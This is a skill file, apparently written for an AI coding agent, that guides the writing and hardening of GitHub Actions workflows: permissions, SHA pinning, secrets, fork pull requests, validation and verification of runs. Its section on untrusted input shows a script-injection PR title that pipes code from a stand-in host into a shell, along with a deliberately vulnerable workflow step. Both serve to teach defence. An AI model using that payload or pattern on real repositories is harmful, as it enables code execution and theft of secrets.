---
name: github-actions
description: Writes, changes and debugs GitHub Actions workflows under .github/workflows, covering CI for tests, lint and builds, scheduled jobs, deploys and tag-triggered releases. Starts from how the repo already builds and tests, writes the smallest workflow that proves value, hardens it (least-privilege permissions, actions pinned to commit SHAs, no script injection, safe secrets and fork-PR handling), validates it before pushing, then watches the run and fixes the real cause of any failure. Use when the user invokes /github-actions, asks to add or set up CI/CD, a pipeline, a workflow or automated checks, wants a failing or slow Actions run diagnosed, or whenever a task touches a file under .github/workflows, even if GitHub Actions is never named.
---

# GitHub Actions

A workflow file is shared infrastructure. It runs on every contributor's
push, holds the repository's token and secrets, and blocks every merge when
it is wrong. So: read the repo first, start small, harden what gets
written, prove it runs, and ship it through a pull request people can
review.

## Look before writing

```bash
ls .github/workflows/ .github/actions/ .github/dependabot.yml 2>/dev/null
gh api repos/{owner}/{repo} --jq .default_branch   # gh fills {owner}/{repo}
gh pr checks <recent-pr-number> --required         # what gates merging today
```

- **Existing workflows are the convention.** Match their naming, runner,
  pinning and caching style. Add a job or step to an existing workflow
  before creating another file that repeats checkout and install.
- **Find the commands people really run**: `package.json` scripts, a
  Makefile or justfile, tox/nox, CONTRIBUTING. Run them locally first, then
  have CI call those same entry points. A workflow with its own private
  test invocation drifts away from what developers run.
- **Take tool versions from the repo's own files** (`.nvmrc`,
  `.python-version`, `go.mod`, `rust-toolchain.toml`) through the setup
  action's `*-version-file` input, so CI and laptops agree. When a version
  has to be written inline, quote it: unquoted `3.10` is the number 3.1.
- **Know what gates merging.** Required checks match on job name. A renamed
  job, or a required workflow skipped by a `paths:` or `branches:` filter,
  leaves every PR waiting on a check that never reports. A repo with a
  merge queue also needs the `merge_group` trigger on required workflows.
- **Unfamiliar stack?** Start from the tool's documented workflow or
  GitHub's `actions/starter-workflows` rather than from memory (see
  `github-lookup`), then harden it as below.

## Start with the smallest useful workflow

One job, running checks that already pass locally, on pull requests and the
default branch. A matrix, coverage upload, deploys and bots each come later
as their own reviewable change.

```yaml
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@<40-char-commit-sha> # vX.Y.Z
        with:
          persist-credentials: false
      - uses: actions/setup-node@<40-char-commit-sha> # vX.Y.Z
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
```

Every line is there for a reason:

- **Triggers.** `pull_request` plus `push` to the default branch only. A
  bare `on: push` runs twice for every PR branch. Other triggers when the
  job calls for them: `workflow_dispatch` (manual), `schedule` (cron in
  UTC, default branch only, often delayed at the top of the hour, paused
  after 60 days without activity in public repos), version tags (see
  `github-releases`). `workflow_dispatch` and `schedule` start working only
  once the file is on the default branch.
- **`permissions`.** Naming one permission sets every other to none, so the
  top-level `contents: read` is the whole grant. A job that needs more gets
  its own block (`contents: write` to create a release, `pull-requests:
  write` to comment, `id-token: write` for OIDC). That block replaces the
  top-level one, so repeat `contents: read` in it.
- **`persist-credentials: false`.** Checkout otherwise leaves the token in
  the local git config for every later step to read. Drop the line only in
  a job that pushes.
- **`concurrency`.** Cancels a PR's superseded runs and lets default-branch
  runs finish. Never cancel a deploy or release job halfway.
- **`timeout-minutes`.** The default is 360, so one hung test burns six
  hours. Set two to three times the normal duration.
- **Caching** through the setup action's `cache:` input, keyed on the
  lockfile. Reach for `actions/cache` only for what setup actions don't
  cover.
- **No matrix** until the project claims support for several versions or
  operating systems; each cell costs a full run. With one, set `fail-fast:
  false` when every cell's result matters.

## Pin actions to a commit SHA

A tag can be repointed. Whoever controls an action's repository, or breaks
into it, can move `v4` to new code, and that code runs with the workflow's
token and secrets. A full commit SHA cannot move. Pin every action that
lives in another repository, GitHub's own `actions/*` included, because one
rule is easier to audit than two.

Version numbers from memory are stale. Look them up each time:

```bash
gh api repos/OWNER/REPO/releases/latest --jq .tag_name   # e.g. v1.2.3
git ls-remote https://github.com/OWNER/REPO 'refs/tags/v1.2.3' 'refs/tags/v1.2.3^{}'
```

When `ls-remote` prints a second line ending in `^{}`, the tag is annotated
and that line holds the commit; use it, not the tag object on the first
line. Without `gh`: `git ls-remote --sort=-v:refname --tags
https://github.com/OWNER/REPO 'v*' | head -5`. Take the SHA from the
action's own repository, never a fork, and skim the release notes when the
major version changed since the repo last used it.

Write `uses: OWNER/REPO@<sha> # v1.2.3`. With the version on the same line,
Dependabot updates SHA and comment together. A pin never updates itself and
gets no Dependabot security alerts, so make sure `.github/dependabot.yml`
has a `github-actions` entry:

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

Every new action is a dependency with access to the token. For a few lines
of shell, a `run:` step beats one.

Exception: a repo with `.github/workflows/actions.lock` uses GitHub's
workflow dependency lockfile. Keep `uses:` on readable version tags there
and run `gh actions-lock` after changing any of them; never edit the
lockfile by hand. Adopting a lockfile is the owner's decision, so propose
it rather than introduce it.

## Untrusted input and secrets

`${{ }}` expressions are pasted into a `run:` script as text before the
shell starts, so a pull request titled `"; curl evil.example | sh; "`
becomes code. Anything an outsider can type is untrusted: PR and issue
titles and bodies, comments, labels, branch names (`github.head_ref`),
commit messages, author names. Hand those values to the script as data:

```yaml
# vulnerable: the title becomes part of the script
- run: echo "Checking ${{ github.event.pull_request.title }}"

# safe: the title arrives in a variable the shell never parses as code
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $TITLE"
```

Secrets:

- Map a secret into the `env:` of the one step that uses it. Set job-wide,
  it is readable by every step and every action in the job.
- Keep it out of the log: no `echo`, no `set -x`, no `env` dump, no verbose
  HTTP flags near it. Masking matches the exact value only, so a base64 or
  JSON-wrapped copy prints in clear.
- Prefer OIDC (`id-token: write`) over a stored long-lived key wherever the
  cloud or registry supports it.
- The agent cannot read or set secret values. List the secret names the
  workflow expects in the PR, so the owner can add them.

Under `pull_request`, a PR from a fork gets a read-only token and no
secrets. That is the protection working. Skip the steps that need secrets
(`if: github.event_name != 'pull_request' ||
github.event.pull_request.head.repo.full_name == github.repository`)
instead of reaching for a privileged trigger.

`pull_request_target`, `workflow_run` and `issue_comment` run with the base
repository's secrets and a write-capable token, on events an outsider can
cause. They stay safe only while nothing from the pull request is executed:
no checkout of the PR head followed by install, build or test (`npm
install` alone runs the PR's scripts), no `gh pr checkout`, no running a
downloaded artifact. Never run fork code where secrets are in reach. The
default answer is `pull_request`. When a task needs both sides, such as
commenting test results on fork PRs, split it: an unprivileged
`pull_request` workflow uploads an artifact, and a `workflow_run` workflow
reads it strictly as data. Read "Securely using pull_request_target" in
GitHub's docs before writing one, flag the trigger in the PR description,
and leave GitHub's guard rails on (`allow-unsafe-pr-checkout`, a
write-capable `cache-mode`, an event policy re-allowing the trigger) unless
the owner decides otherwise.

## Validate before pushing

A broken workflow fails only after the push, in front of everyone.

```bash
actionlint   # from the repo root
```

It checks syntax, expressions, runner labels, inputs of common actions and,
with `shellcheck` installed, the `run:` scripts. Install with `go install
github.com/rhysd/actionlint/cmd/actionlint@latest`, `brew install
actionlint`, or the download script in its README. Without it, at least
prove the file parses as YAML (`yq . FILE`, or `python3 -c 'import
sys,yaml; yaml.safe_load(open(sys.argv[1]))' FILE`) and say in the PR that
actionlint was not run. PyYAML loads the `on:` key as boolean `True`; that
is a YAML 1.1 quirk, not a defect.

Run each `run:` command locally once as well. Linting proves the YAML is
valid, not that `npm test` passes.

## Verify after pushing

The work is done when a run has passed, not when the file is committed.

```bash
git push -u origin <branch>
gh run list --branch <branch> --limit 5         # run id; appears after a few seconds
gh run watch <run-id> --exit-status --compact   # blocks; non-zero on failure
gh run view <run-id> --log-failed > /tmp/ci.log 2>&1
grep -n -i -m 20 'error\|fail' /tmp/ci.log      # grep the log, don't dump it
```

- **No run appeared?** Likeliest first: a branch or path filter doesn't
  match; the trigger is `workflow_dispatch` or `schedule` and the file is
  not on the default branch yet; the file is invalid (the Actions tab lists
  it by path with the error); Actions is disabled or a first-time
  contributor awaits approval; the push came from a workflow's own
  `GITHUB_TOKEN`, which starts no new runs.
- **Tag-, schedule- or dispatch-only workflow?** Exercise it before merge
  through a temporary `pull_request` trigger with the publishing steps
  guarded by `if:`, and remove the trigger before merging.
- **Failed?** Read the failing step's log, reproduce locally, fix the
  cause, push again. Usual clean-runner differences: a shallow clone
  (history-based tools need `fetch-depth: 0`), files that exist only on a
  developer machine, missing system packages or services.
- **Push rejected over the `workflow` scope?** The token may not modify
  workflow files. Tell the user (`gh auth refresh -s workflow`, or the
  Workflows permission on a fine-grained token); don't route around it.

Green has to mean the checks passed. Do not get there with
`continue-on-error`, `|| true`, `if: false`, a deleted or skipped test,
loosened lint rules, or a filter that keeps the failing job from running.
If a check already fails on the default branch, or is flaky (confirm with
one `gh run rerun <run-id> --failed`), say so and let the user decide. A
visible failure is the honest result.

## Ship it through a draft PR

A workflow changes how everyone on the repo works: new waits, new ways to
fail, new spend. Open a draft PR instead of pushing to the default branch;
the PR is also where a `pull_request` workflow first proves itself. Write
the description with `github-docs`. A reviewer should learn from it,
without reading YAML:

- what triggers the workflow and what it now blocks
- the permissions it requests, the secrets it expects, the actions it adds
- settings the owner has to change by hand (add secrets, mark the check
  required, create an environment)
- how to run the same checks locally, and roughly how long a run takes
- a link to a passing run

## Related skills

- `github-releases`: versioning, tagging and publishing; its reference
  file has a tag-triggered release workflow to build on.
- `github-docs`: the PR description and README changes, scaled to how many
  people the workflow affects.
- `github-lookup`: look for an existing action or workflow before writing
  a custom one, and vet it like any dependency.
- `lean-output`: CI logs are long. Send them to a file and grep them.
